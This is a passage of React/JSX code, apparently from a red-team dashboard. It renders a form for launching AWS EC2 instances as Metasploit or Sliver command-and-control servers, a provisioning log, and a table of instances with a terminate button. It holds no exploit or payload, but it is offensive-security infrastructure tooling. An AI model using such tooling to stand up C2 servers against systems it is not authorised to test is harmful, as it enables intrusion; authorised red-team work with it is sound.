                      <select value={launchC2Type} onChange={e => setLaunchC2Type(e.target.value as 'msf' | 'sliver')} style={{ width: '100%', padding: '6px 10px', fontSize: 12, background: 'var(--bg)', border: rule, color: 'var(--fg)' }}>
                        <option value="msf">Metasploit</option>
                        <option value="sliver">Sliver</option>
                      </select>
                    </div>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>REGION</label>
                      <select value={launchRegion} onChange={e => setLaunchRegion(e.target.value)} style={{ width: '100%', padding: '6px 10px', fontSize: 12, background: 'var(--bg)', border: rule, color: 'var(--fg)' }}>
                        {['us-east-1','us-east-2','us-west-1','us-west-2','eu-west-1','eu-west-2','eu-central-1','ap-southeast-1','ap-southeast-2','ap-northeast-1'].map(r => <option key={r} value={r}>{r}</option>)}
                      </select>
                    </div>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>INSTANCE TYPE</label>
                      <select value={launchInstanceType} onChange={e => setLaunchInstanceType(e.target.value)} style={{ width: '100%', padding: '6px 10px', fontSize: 12, background: 'var(--bg)', border: rule, color: 'var(--fg)' }}>
                        <option value="t3.micro">t3.micro (free tier)</option>
                        <option value="t3.small">t3.small</option>
                        <option value="t3.medium">t3.medium (Recommended)</option>
                        <option value="t3.large">t3.large</option>
                        <option value="c5.xlarge">c5.xlarge</option>
                      </select>
                    </div>
                  </div>
                  <div style={{ display: 'flex', gap: 8 }}>
                    <button onClick={handleLaunchEC2} disabled={launchingInstance || !launchName} className="btn btn-sm" style={{ color: '#a78bfa', borderColor: 'rgba(167,139,250,0.4)' }}>
                      {launchingInstance ? 'Launching…' : 'Launch EC2 Instance'}
                    </button>
                    <button onClick={() => setLaunchFormOpen(false)} className="btn btn-sm btn-ghost">Cancel</button>
                  </div>
                </div>
              )}

              {provisionLog.length > 0 && (
                <div style={{ borderBottom: rule }}>
                  <div style={{ padding: '8px 16px', borderBottom: rule, background: 'rgba(0,0,0,0.2)', display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ fontSize: 10, color: 'var(--accent)', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '0.1em' }}>
                      {provisionInstanceId ? `Provisioning ${provisionInstanceId}` : 'Provision Log'}
                    </span>
                    <button onClick={() => setProvisionLog([])} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', marginLeft: 'auto', padding: 0 }}>
                      <Icon name="x" size={12} />
                    </button>
                  </div>
                  <div ref={provisionLogRef} style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--fg-2)', padding: 12, maxHeight: 200, overflowY: 'auto', background: 'var(--bg)', lineHeight: 1.6 }}>
                    {provisionLog.map((line, i) => <div key={i}>{line}</div>)}
                  </div>
                </div>
              )}

              {cloudInstances.length === 0 ? (
                <div style={{ padding: '32px 16px', textAlign: 'center', color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', fontSize: 11 }}>No cloud instances. Configure AWS credentials and launch an EC2 node above.</div>
              ) : (
                <table className="data">
                  <thead>
                    <tr>
                      <th>Name</th>
                      <th style={{ width: 80 }}>C2 Type</th>
                      <th style={{ width: 130 }}>Instance ID</th>
                      <th style={{ width: 120 }}>Public IP</th>
                      <th style={{ width: 80 }}>Region</th>
                      <th style={{ width: 100 }}>Status</th>
                      <th style={{ width: 60 }}></th>
                    </tr>
                  </thead>
                  <tbody>
                    {cloudInstances.map(inst => {
                      const statusColor = inst.status === 'ready' ? 'var(--ok)' : inst.status === 'error' ? 'var(--crit)' : inst.status === 'running' || inst.status === 'configuring' ? 'var(--accent)' : 'var(--fg-3)'
                      return (
                        <tr key={inst.id}>
                          <td style={{ fontWeight: 500, fontSize: 12 }}>{inst.name}</td>
                          <td>
                            <span style={{ fontSize: 10, padding: '2px 7px', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '0.06em', color: inst.c2_type === 'msf' ? 'var(--accent)' : '#a78bfa' }}>{inst.c2_type}</span>
                          </td>
                          <td className="mono" style={{ fontSize: 10, color: 'var(--fg-3)' }}>{inst.instance_id || '—'}</td>
                          <td className="mono" style={{ fontSize: 11 }}>{inst.public_ip ?? '—'}</td>
                          <td className="mono" style={{ fontSize: 10, color: 'var(--fg-3)' }}>{inst.region}</td>
                          <td>
                            <span style={{ fontSize: 10, padding: '2px 7px', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '0.06em', color: statusColor }}>{inst.status}</span>
                          </td>
                          <td>
                            <button
                              onClick={() => fetch(`${getApiBase()}/cloud/instances/${inst.id}`, { method: 'DELETE' }).then(() => loadCloudInstances())}
                              className="btn btn-sm btn-ghost"
                              style={{ fontSize: 10, color: 'var(--crit)' }}
                              title="Terminate instance"
                            >Term</button>
                          </td>
                        </tr>
                      )
                    })}
                  </tbody>
                </table>
              )}
            </div>

          </div>
        )}

      </div>
    </div>
  )
}
